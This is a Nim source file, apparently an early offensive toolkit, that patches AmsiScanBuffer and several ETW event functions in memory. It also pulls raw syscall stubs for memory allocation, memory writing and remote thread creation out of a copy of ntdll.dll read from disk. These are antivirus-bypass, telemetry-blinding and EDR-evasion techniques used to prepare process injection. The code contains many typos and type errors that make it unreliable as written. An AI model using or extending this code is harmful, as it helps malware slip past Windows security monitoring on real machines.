import winim/lean

#prcedural types
type myNtAllocateVirtualMemory = proc(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    ZeroBits: ULONG,
    RegionSize: PSIZE_T,
    AllocationType: ULONG,
    Protect: ULONG
): NTSTATUS {.stdcall.}

type myNtWriteVirtualMemory = proc(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
    Buffer: PVOID,
    NumberOfBytesToWrite: ULONG,
    NumberOfBytesWritten: PULONG
): NTSTATUS {.stdcall.}

type myNtCreateThreadEx = proc(
    ThreadHandle: PHANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: PROJECT_ATTRIBUTES,
    ProcessHandle: HANDLE,
    StartRoutine: PVOID,
    Argument: PVOID,
    CreateFlags: ULONG,
    ZeroBits: SIZE_T,
    StackSize: SIZE_T,
    MaximumStackSize: SIZE_T,
    AttributeList PVOID
): NTSTATUS {.stdcall.}


#functions
proc PatchAMSI()* =
    let size = 6
    var oldProtect: DWORD
    let patch: array[6, byte] = [
    0xB8'u8, 0x57, 0x00, 0x07, 0x80, 0xC3
    ]

    let amsi = LoadLibraryA("amsi.dll")
    if cast[uint](amsi) == 0:
        return
    let amsiscanbuffer = GetProcAddress(amsi,"AmsiScanBuffer")
    if cast[uint](amsiscanbuffer) == 0:
        return

    if VirtualProtect(amsiscanbuffer,size,PAGE_EXECUTE_WRITECOPY, addr oldProtect) != 0:
        copyMem(amsiscanbuffer,addr path,size)
        discard VirtualProtect(amsiscanbuffer,size,oldProtect, addr oldProtect)
    echo "AMSI funtion activated and done!"
    
proc PathETW()* =
    let etwFuncs = [
      "EtwEventWrite",
      "EtwEventWriteEx",
      "EtwEventWriteFull",
      "EtwEventWriteString",
      "EtwEventWriteTransfer",
      "EtwEventActivityIdControl"
    ]
    let patch : array(1,byte) = [0xC3]
    let oldProtect : DWORD
    let size = 1
    let ntdll = GetModuleHandleA("ntdll.dll")
    if cast[uint](ntdll) == 0:
        return
    
    for f in etwFuncs:
        let function = GetProcAddress(ntdll,f)
        if cast[uint](function) == 0:
            continue
        if VirtualProtect(function,size,PAGE_EXECUTE_WRITECOPY,addr oldProtect) != 0:
            copyMem(function, addr path, size)
            discard VirtualProtect(function,size,oldProtect,addr oldProtect)
    
    echo "AMSI funtion activated and done!"
    
proc RVAtoRAW(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
    return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)

proc GetSyscallStub(function_name: LPCSTR, syscall_stub LPVOID) =
    #let syscall_list = ["NtAllocate:VirtualMemory","NtWriteVirtualMemory","NtCreateThreadEx"]
    var
        file: HANDLE
        fileSize: DWORD
        bytesRead: DWORD
        fileData: LPVOID
        ntdllString: LPCSTR = "C:\\windows\\system32\\ntdll.dll"
        nullHandle: HANDLE

    file = CreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
    fileSize = GetFileSize(file, nil)
    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize)
    ReadFile(file, fileData, fileSize, addr bytesRead, nil)

    var dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
    var ntHeader: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData)+dosHeader.e_lfanew)
    var firstSection: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(ntHeader)
    var exportDirRVA: DWORD = ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    var rdatasection: PIMAGE_SECTION_HEADER = firstSection

    var i: uint16 = 0

    for section in i..< ntHeader.FileHeader.NumberOfSections:
        var sectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](firstSection) + cast[DWORD_PTR](section * IMAGE_SIZEOF_SECTION_HEADER))
        if ".rdata" in toString(sectionHeader.Name):
            rdatasection = sectionHeader
    

    var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](exportDirRVA + cast[DWORD_PTR](fileData), rdatasection) 

    var addressOfNames: PDOWRD = cast[PDWORD](RVAtoRAW(cast[DWORD_PTR](exportDirectory.AddressOfNames) + cast[DWORD_PTR](fileData) ,rdatasection))
    var addressOfFunctions: PDOWRD = cast[PDWORD](RVAtoRAW(cast[DWORD_PTR](exportDirectory.AddressOfFunctions) + cast[DWORD_PTR](fileData) ,rdatasection))

    #addressofName -> returns the RVA of the array of RVA whcih points to function name
    #addressofFunction -> returns the RVA of the array of RVA which points to the function code or the starting line of the function
    var stubFound: BOOL = 0
    echo "GetSyscallStub activated !"
    for function in i..< exportDirectory.NumberOfNames:
        var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRAW(cast[DWORD_PTR](fileData)+ addressOfNames[function],rdatasection))
        var functionNameResolved: LPCSTR = cast[LPCSTR](functionNameVA)
        var compare: int = lstrcmpA(functionNameResolved,function_name)
        if (compare == 0):
            var functionOrdinal :DWORD = exportDirectory.AddressOfNameOrdinals[function]
            var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRAW(cast[DWORD_PTR](fileData)+addressOfFunctions[functionOrdinal],rdatasection))
            copyMem(syscall_stub,cast[LPVOID](functionVA),23) #size of syscallstub
            stubFound = 1
            return stubFound
    
    return stubFound

#here i didnt implement the functions within array method,
#since the os itself will create multiple reagion in memory
#where each stubs will be stored.
proc makeNtAllocateVirtualMemory()* =
    var oldProtect: DWORD
    var stub : LPVOID = VirtualAlloc(NULL,cast[SIZE_T](23),MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE)
    discard GetSyscallStub("NtAllocateVirtualMemory",stub)
    VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](stub)
    echo "from the makeNtAllocateVirtualMemory function and it is done !"

proc makeNtWriteVirtualMemory()* =
    var oldProtect: DWORD
    var stub : LPVOID = VirtualAlloc(NULL,CAST[SIZE_T](23),MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE)
    discard GetSyscallStub("NtWriteVirtualMemory",stub)
    VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](stub)
    echo "from the makeNtWriteVirtualMemory function and it is done !"


proc makeNtCreateThreadEx()* =
    var oldProtect: DWORD
    var stub: LPVOID = VirtualAlloc(NULL,CAST[SIZE_T](23),MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE)
    discard GetSyscallStub("NtCreateThreadEx",stub)
    VirtualProtect(stub,cast[SIZE_T](23),PAGE_EXECUTE_READ,addr oldProtect)
    let NtCreateThreadEx = cast[myNtCreateThreadEx](stub)
    echo "from the makeNtCreateThreadEx function and it is done !"
